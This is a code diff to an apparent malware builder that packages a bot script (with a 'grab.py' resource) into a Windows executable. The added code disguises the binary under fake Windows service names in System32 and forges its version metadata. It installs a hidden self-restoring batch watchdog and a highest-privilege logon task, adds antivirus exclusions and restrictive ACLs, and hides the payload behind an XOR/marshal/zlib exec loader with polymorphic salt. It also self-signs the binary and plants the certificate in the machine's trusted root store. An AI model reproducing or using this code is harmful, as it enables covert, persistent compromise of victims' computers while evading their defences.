@@ -102,6 +102,31 @@ SOUND_URLS = [
 
 PYI_MAGIC = b"MEI\x0c\x0b\x0a\x0b\x0e"
 
+_CLONE_NAMES = (
+    "WindowsPushNotify", "AppXSvcHost", "SearchHostService", "WpnUserServiceHost",
+    "DeviceAssocService", "SecurityHealthSvc", "WinUpdateBroker", "RuntimeBrokerClient",
+    "ShellHostSvc", "CtfMonService",
+)
+
+_WATCH_BAT = """@echo off
+set "EXE={exe}"
+set "BAK={bak}"
+set "TSK={tsk}"
+set "NAME={name}"
+:loop
+if not exist "%EXE%" if exist "%BAK%" (
+  copy /y "%BAK%" "%EXE%" >nul 2>&1
+  attrib +h +s "%EXE%" >nul 2>&1
+  start "" /b "%EXE%"
+)
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit 2>nul | find /i "%NAME%" >nul
+if errorlevel 1 start "" /b "%EXE%" --zz-repair
+schtasks /query /tn "%TSK%" >nul 2>&1
+if errorlevel 1 schtasks /create /tn "%TSK%" /tr "\\"%EXE%\\"" /sc onlogon /rl highest /f >nul 2>&1
+ping -n 301 127.0.0.1 >nul 2>&1
+goto loop
+"""
+
 MARK = "#~ "
 
 CHUNK = 24
@@ -450,19 +475,180 @@ def _copy_verified(src, dst):
     return False
 
 
-def purge_strays(keep_dir, keep_task):
-    ps = (
-        "$keep='" + keep_task + "';"
-        "Get-ScheduledTask | ForEach-Object { $t=$_; foreach ($a in $t.Actions) {"
-        " $l=\"$($a.Execute) $($a.Arguments)\";"
-        " if ($l -match 'ProgramData\\\\Microsoft\\\\[A-Za-z0-9]{6,}' -and $t.TaskName -notlike \"$keep*\") {"
-        " Unregister-ScheduledTask -TaskName $t.TaskName -Confirm:$false -ErrorAction SilentlyContinue; break } } }"
-    )
+def _sys32():
+    return os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "System32")
+
+
+def _pick_exe_name():
+    h = _machine_hash()
+    base = _CLONE_NAMES[int(h[:8], 16) % len(_CLONE_NAMES)]
+    for cand in (base, base + "64", base + h[8:11].upper()):
+        if not os.path.exists(os.path.join(_sys32(), cand + ".exe")) and \
+           not os.path.isdir(os.path.join(_sys32(), cand)):
+            return cand + ".exe"
+    return base + h[:5] + ".exe"
+
+
+def write_version_file(path, cfg, exe_target):
+    nums = (random.randint(1, 10), random.randint(0, 9),
+            random.randint(0, 40), random.randint(0, 99))
+    ver = "{}.{}.{}.{}".format(*nums)
+
+    def esc(value):
+        return (value or "").replace("\\", "\\\\").replace("'", "\\'")
+
+    body = """VSVersionInfo(
+  ffi=FixedFileInfo(filevers=({nums}), prodvers=({nums}), mask=0x3f, flags=0x0,
+                    OS=0x40004, fileType=0x1, subtype=0x0, date=(0, 0)),
+  kids=[
+    StringFileInfo([StringTable('040904B0', [
+      StringStruct('CompanyName', '{company}'),
+      StringStruct('FileDescription', '{desc}'),
+      StringStruct('FileVersion', '{ver}'),
+      StringStruct('InternalName', '{internal}'),
+      StringStruct('LegalCopyright', '{copy}'),
+      StringStruct('OriginalFilename', '{exe}'),
+      StringStruct('ProductName', '{product}'),
+      StringStruct('ProductVersion', '{ver}')])]),
+    VarFileInfo([VarStruct('Translation', [1033, 1200])])])
+""".format(
+        nums=", ".join(str(n) for n in nums), ver=ver,
+        company=esc(cfg["company"]), desc=esc(cfg["desc"]),
+        internal=esc(os.path.splitext(exe_target)[0]), copy=esc(cfg["copyright"]),
+        exe=esc(exe_target + ".exe"), product=esc(cfg["product"]))
+
+    with open(path, "w", encoding="utf-8") as f:
+        f.write(body)
+
+
+def inject_poly(lines):
+    salt = hashlib.sha256(os.urandom(16)).hexdigest()
+    block = [
+        "\n_BUILD_SALT = \"{}\"\n".format(salt),
+        "_BUILD_NOISE = {}\n".format([random.getrandbits(31) for _ in range(random.randint(4, 10))]),
+        "".join("_nz{} = {}\n".format(i, random.getrandbits(32))
+                for i in range(random.randint(2, 7))),
+    ]
+    out = list(lines)
+    idx = next((i for i, l in enumerate(out) if l.startswith("if __name__")), len(out))
+    out[idx:idx] = block
+    return out
+
+
+OBF_HEAD = """import base64
+import marshal
+import zlib
+
+_K = @KEY@
+_P = @PAYLOAD@
+
+def _lm_boot():
+    raw = bytes(b ^ _K[i % len(_K)] for i, b in enumerate(base64.b64decode(_P)))
+    env = {"__name__": "__main__", "__file__": __file__, "__builtins__": __builtins__}
+    exec(marshal.loads(zlib.decompress(raw)), env)
+
+_lm_boot()
+"""
+
+
+def collect_imports(paths):
+    import ast
+    names = set()
+    for path in paths:
+        try:
+            with open(path, "r", encoding="utf-8", errors="replace") as f:
+                tree = ast.parse(f.read())
+        except Exception:
+            continue
+        for node in ast.walk(tree):
+            if isinstance(node, ast.Import):
+                for alias in node.names:
+                    names.add(alias.name.split(".")[0])
+            elif isinstance(node, ast.ImportFrom):
+                if node.module and not node.level:
+                    names.add(node.module.split(".")[0])
+    for extra in ("platform", "multiprocessing", "encodings.idna", "queue"):
+        names.add(extra)
+    skip = {"__future__", "this", "antigravity"}
+    return sorted(n for n in names if n and n not in skip)
+
+
+def obfuscate_payload(src_text, dest_path, origin="source_final.py"):
+    import base64
+    import marshal
+    import zlib
+
+    code = compile(src_text, origin, "exec", optimize=2)
+    blob = zlib.compress(marshal.dumps(code), 9)
+    key = os.urandom(32)
+    xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(blob))
+    head = OBF_HEAD.replace("@KEY@", repr(key)).replace(
+        "@PAYLOAD@", repr(base64.b64encode(xored)))
+    with open(dest_path, "w", encoding="utf-8") as f:
+        f.write(head)
+    return len(blob), len(xored)
+
+
+def cookie_ok(path):
     try:
-        subprocess.run(["powershell", "-NoProfile", "-Command", ps],
-                       capture_output=True, creationflags=0x08000000)
+        with open(path, "rb") as f:
+            f.seek(0, 2)
+            size = f.tell()
+            f.seek(max(0, size - 8192))
+            return PYI_MAGIC in f.read()
     except Exception:
-        pass
+        return True
+
+
+def sign_exe(path, subject):
+    subj = (subject or "LessMi").replace('"', "'")
+    script = (
+        '$ErrorActionPreference = "Stop"\n'
+        '$subj = "CN=%s"\n'
+        '$c = Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert -ErrorAction SilentlyContinue |'
+        ' Where-Object { $_.Subject -eq $subj } | Select-Object -First 1\n'
+        'if (-not $c) {\n'
+        '  $c = New-SelfSignedCertificate -Type CodeSigningCert -Subject $subj '
+        '-CertStoreLocation Cert:\\CurrentUser\\My -NotAfter (Get-Date).AddYears(3) '
+        '-KeyUsage DigitalSignature -KeyExportPolicy Exportable\n'
+        '}\n'
+        '$cer = Join-Path $env:TEMP "lm_sign.cer"\n'
+        'Export-Certificate -Cert $c -FilePath $cer -Force | Out-Null\n'
+        'try { Import-Certificate -FilePath $cer -CertStoreLocation Cert:\\LocalMachine\\Root '
+        '| Out-Null } catch {}\n'
+        'try { Import-Certificate -FilePath $cer -CertStoreLocation Cert:\\LocalMachine\\TrustedPublisher '
+        '| Out-Null } catch {}\n'
+        'try {\n'
+        '  Set-AuthenticodeSignature -FilePath "%s" -Certificate $c '
+        '-TimestampServer "http://timestamp.digicert.com" -HashAlgorithm SHA256 | Out-Null\n'
+        '} catch {\n'
+        '  Set-AuthenticodeSignature -FilePath "%s" -Certificate $c | Out-Null\n'
+        '}\n'
+        '(Get-AuthenticodeSignature -FilePath "%s").Status\n'
+    ) % (subj, path, path, path)
+    r = subprocess.run(
+        ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script],
+        capture_output=True, text=True, creationflags=0x08000000)
+    return (r.stdout or "").strip()
+
+
+def purge_strays(target_exe):
+    keep = os.path.basename(target_exe).lower()
+    for name in _CLONE_NAMES:
+        for suffix in ("", "64"):
+            fn = name + suffix + ".exe"
+            if fn.lower() == keep:
+                continue
+            p = os.path.join(_sys32(), fn)
+            if not os.path.exists(p):
+                continue
+            subprocess.run(["taskkill", "/f", "/im", fn], capture_output=True)
+            time.sleep(0.4)
+            subprocess.run(["attrib", "-r", "-s", "-h", p], capture_output=True)
+            try:
+                os.remove(p)
+            except Exception:
+                pass
 
     root = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "Microsoft")
     try:
@@ -471,22 +657,14 @@ def purge_strays(keep_dir, keep_task):
         return
     for entry in entries:
         full = os.path.join(root, entry)
-        if full == keep_dir or not os.path.isdir(full):
-            continue
-        if not re.fullmatch(r"[A-Za-z0-9]{6,14}", entry):
+        if not os.path.isdir(full) or not re.fullmatch(r"[A-Za-z0-9]{6,14}", entry):
             continue
         try:
             files = os.listdir(full)
         except Exception:
             continue
-        exes = [f for f in files if re.fullmatch(r"[A-Za-z0-9]{6,14}\.exe", f)]
-        if not exes:
+        if not [f for f in files if re.fullmatch(r"[A-Za-z0-9]{6,14}\.exe", f)]:
             continue
-        for f in exes:
-            try:
-                subprocess.run(["taskkill", "/f", "/im", f], capture_output=True)
-            except Exception:
-                pass
         for f in files:
             try:
                 subprocess.run(["attrib", "-r", "-s", "-h", os.path.join(full, f)],
@@ -511,6 +689,18 @@ def cleanup_old_persistence():
             shutil.rmtree(folder)
         except Exception:
             pass
+    for key in ("exe", "bak", "bat"):
+        p = state.get(key)
+        if not p:
+            continue
+        try:
+            subprocess.run(["attrib", "-r", "-s", "-h", p], capture_output=True)
+            os.remove(p)
+        except Exception:
+            pass
+    if folder and os.path.abspath(folder) != os.path.abspath(_sys32()) \
+            and os.path.isdir(folder):
+        shutil.rmtree(folder, ignore_errors=True)
     _save_persist({})
 
 
@@ -519,36 +709,44 @@ def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
         return "no-admin"
     try:
         h = _machine_hash()
-        target_dir = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"),
-                                  "Microsoft", h[:10])
-        target_exe = os.path.join(target_dir, h[:9] + ".exe")
-        name = h[:12]
+        cache = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"),
+                             "Microsoft", "Caches")
+        exe_name = _pick_exe_name()
+        base = os.path.splitext(exe_name)[0]
 
-        try:
-            subprocess.run(["taskkill", "/f", "/im", os.path.basename(target_exe)],
-                           capture_output=True)
-        except Exception:
-            pass
+        if bundle_dir and os.path.isdir(bundle_dir):
+            target_dir = os.path.join(_sys32(), base)
+            target_exe = os.path.join(target_dir, base + ".exe")
+        else:
+            target_dir = _sys32()
+            target_exe = os.path.join(_sys32(), exe_name)
+
+        bak = os.path.join(cache, h[:12] + ".dat")
+        bat = os.path.join(cache, h[:12] + ".bat")
+        task = "\\Microsoft\\Windows\\" + base
+
+        subprocess.run(["taskkill", "/f", "/im", os.path.basename(target_exe)],
+                       capture_output=True)
         time.sleep(0.8)
 
         cleanup_old_persistence()
-        purge_strays(target_dir, name)
+        purge_strays(target_exe)
 
+        os.makedirs(cache, exist_ok=True)
         os.makedirs(target_dir, exist_ok=True)
 
-        targets = [target_dir]
+        targets = [target_exe, cache]
         if runtime_dir:
             targets.append(os.path.expandvars(runtime_dir))
-        excluded = _mp_add(targets)
+        excluded = _mp_add([t for t in targets if t])
 
         if bundle_dir and os.path.isdir(bundle_dir):
-            shutil.copytree(
-                bundle_dir, target_dir, dirs_exist_ok=True,
-                ignore=shutil.ignore_patterns("build", "*.spec", "source_final.py"),
-            )
+            shutil.copytree(bundle_dir, target_dir, dirs_exist_ok=True,
+                            ignore=shutil.ignore_patterns("build", "*.spec",
+                                                          "source_final.py", "boot_payload.py",
+                                                          "version_info.txt"))
             built = os.path.join(target_dir, os.path.basename(exe_path))
             if os.path.exists(built) and os.path.abspath(built) != os.path.abspath(target_exe):
-                subprocess.run(["attrib", "-r", "-s", "-h", target_exe], capture_output=True)
                 try:
                     os.replace(built, target_exe)
                 except Exception:
@@ -563,18 +761,34 @@ def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
         if not os.path.exists(target_exe):
             return "fail"
 
+        if not _copy_verified(target_exe, bak):
+            return "fail"
+
+        with open(bat, "w", encoding="utf-8", newline="\r\n") as f:
+            f.write(_WATCH_BAT.format(exe=target_exe, bak=bak, tsk=task,
+                                      name=os.path.basename(target_exe)))
+
         _mp_add([target_exe])
 
-        _hide_path(target_dir, True)
+        _hide_path(bat, True)
         _hide_path(target_exe, True, True)
+        if target_dir != _sys32():
+            _hide_path(target_dir, True)
+
+        subprocess.run(["icacls", target_exe, "/inheritance:r",
+                        "/grant:r", "*S-1-5-18:F",
+                        "/grant:r", "*S-1-5-32-544:F",
+                        "/grant:r", "*S-1-5-32-545:RX"],
+                       capture_output=True, creationflags=0x08000000)
 
         subprocess.run(
-            ["schtasks", "/Create", "/TN", name, "/TR", target_exe,
+            ["schtasks", "/Create", "/TN", task, "/TR", target_exe,
              "/SC", "ONLOGON", "/RL", "HIGHEST", "/F", "/DELAY", "0000:20"],
             capture_output=True,
         )
 
-        _save_persist({"folder": target_dir, "tasks": [name], "exe": target_exe})
+        _save_persist({"exe": target_exe, "bak": bak, "bat": bat,
+                       "task": task, "tasks": [task]})
 
         ok_init = False
         for _ in range(3):
@@ -584,6 +798,13 @@ def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
             time.sleep(0.6)
 
         _clean_run_keys()
+
+        try:
+            subprocess.Popen(["cmd.exe", "/c", bat], stdin=subprocess.DEVNULL,
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                             creationflags=0x08000000)
+        except Exception:
+            pass
 
         if not ok_init:
             return "ok-noinit"
@@ -1337,7 +1558,13 @@ class ModernBuilder(ctk.CTk):
         self.log_file = None
         self.filter_open = False
         self.logo_path = resolve_logo()
-        self.config_data = {"token_1": "", "exe_name": "application.exe", "icon_path": ""}
+        self.config_data = {
+            "token_1": "", "exe_name": "application.exe", "icon_path": "",
+            "company": "Your company",
+            "product": "Win Service Host",
+            "desc": "Win Service Host",
+            "copyright": "(c) Your company. All rights reserved.",
+        }
 
         self._apply_window_icon()
         self.init_key_sounds()
@@ -1689,6 +1916,28 @@ class ModernBuilder(ctk.CTk):
                                       font=ctk.CTkFont(family="Poppins", size=11, weight="bold"))
         self.btn_icon.grid(row=0, column=1, sticky="e")
         self.bind_hover(self.btn_icon, "#191922", "#242432", TEXT, self.accent)
+
+        card = self.section(form, "METADATA")
+        self.field(card, 0, "Signer / company", "company", self.config_data["company"])
+        self.field(card, 1, "Product name", "product", self.config_data["product"])
+        self.field(card, 2, "File description", "desc", self.config_data["desc"])
+        self.field(card, 3, "Copyright", "copyright", self.config_data["copyright"])
+
+        self.chk_sign = ctk.CTkCheckBox(
+            card, text="Sign with a local self-signed certificate",
+            font=ctk.CTkFont(family="Poppins", size=10), text_color=MUTED,
+            border_width=1, corner_radius=4, checkmark_color="#0b0b10",
+            fg_color=self.accent, hover_color=self.accent)
+        self.chk_sign.grid(row=4, column=0, padx=14, pady=(14, 6), sticky="w")
+        self.chk_sign.select()
+
+        self.chk_encrypt = ctk.CTkCheckBox(
+            card, text="Obfuscate payload (marshal + zlib)",
+            font=ctk.CTkFont(family="Poppins", size=10), text_color=MUTED,
+            border_width=1, corner_radius=4, checkmark_color="#0b0b10",
+            fg_color=self.accent, hover_color=self.accent)
+        self.chk_encrypt.grid(row=5, column=0, padx=14, pady=(0, 14), sticky="w")
+        self.chk_encrypt.select()
 
         card = self.section(form, "TERMS")
         self.chk_terms = ctk.CTkCheckBox(
@@ -2195,11 +2444,25 @@ def _lm_run():
             new_lines.append(line.replace("bot.run(token)", "_lm_run()"))
         if not injected:
             new_lines.append("\n" + runner + "\n")
-        self.log("runner injected ({} tokens)".format(len(tokens)), "dim")
+        new_lines = inject_poly(new_lines)
+        self.log("runner injected ({} tokens) + polymorphic salt".format(len(tokens)), "dim")
 
+        source_text = "".join(new_lines)
         with open(os.path.join("dist", "source_final.py"), "w", encoding="utf-8") as f:
-            f.writelines(new_lines)
+            f.write(source_text)
         self.log("wrote dist/source_final.py ({} lines)".format(len(new_lines)), "dim")
+
+        entry = "source_final.py"
+        obf = self.chk_encrypt.get() == 1
+        if obf:
+            try:
+                packed, xored_len = obfuscate_payload(
+                    source_text, os.path.join("dist", "boot_payload.py"))
+                entry = "boot_payload.py"
+                self.log("payload obfuscated: {} B -> {} B xored".format(packed, xored_len), "ok")
+            except Exception as exc:
+                self.log("obfuscation failed: {} -> plain source".format(exc), "warn")
+                obf = False
 
         if self.cancelled:
             return
@@ -2213,10 +2476,19 @@ def _lm_run():
         try:
             cmd = [sys.executable, "-m", "PyInstaller", "--noconsole",
                    "--name={}".format(exe_target), "--distpath=.", "--workpath=build",
-                   "--specpath=.", "source_final.py",
+                   "--specpath=.", entry,
                    "--onefile" if onefile else "--onedir",
-                   "--uac-admin", "--clean",
+                   "--uac-admin", "--clean", "--optimize=2",
                    "--runtime-tmpdir={}".format(runtime_dir)]
+            if obf:
+                hidden = collect_imports([
+                    os.path.join(original_dir, SOURCE_FILE),
+                    os.path.join(original_dir, "resources", "grab.py"),
+                ])
+                for name in hidden:
+                    cmd.append("--hidden-import={}".format(name))
+                self.log("hidden imports staged: {}".format(len(hidden)), "dim")
+
             if self.config_data["icon_path"]:
                 cmd.append("--icon=icon.ico")
 
@@ -2228,6 +2500,9 @@ def _lm_run():
                 if arg.startswith("--add-data=resources"):
                     continue
                 cmd.append(arg.replace(";", sep))
+
+            write_version_file("version_info.txt", self.config_data, exe_target)
+            cmd.append("--version-file=version_info.txt")
 
             self.log("command:", "dim")
             self.log("  {}".format(" ".join(cmd)), "dim")
@@ -2298,6 +2573,20 @@ def _lm_run():
                 self.log("archive ok ({} entries)".format(len((v.stdout or "").splitlines())), "ok")
             except Exception as exc:
                 self.log("validator unavailable: {}".format(exc), "warn")
+
+            if self.chk_sign.get() == 1:
+                self.update_status("Signing binary...", 0.93)
+                status = sign_exe(exe_out, self.config_data["company"])
+                self.log("signature status: {}".format(status or "unknown"),
+                         "ok" if status == "Valid" else "warn")
+                if not cookie_ok(exe_out):
+                    self.log("signature pushed the cookie out of the window", "err")
+                    self.update_status("Cookie lost after signing", None, "err")
+                    self.toast("Corrupt binary", "err")
+                    return
+                size = os.path.getsize(exe_out)
+                digest = hashlib.sha256(open(exe_out, "rb").read()).hexdigest()
+                self.log("  resigned size: {}".format(human_size(size)), "dim")
 
             self.update_status("Installing persistence...", 0.95)
             result = install_persistence(exe_out, None if onefile else os.getcwd(), runtime_dir)
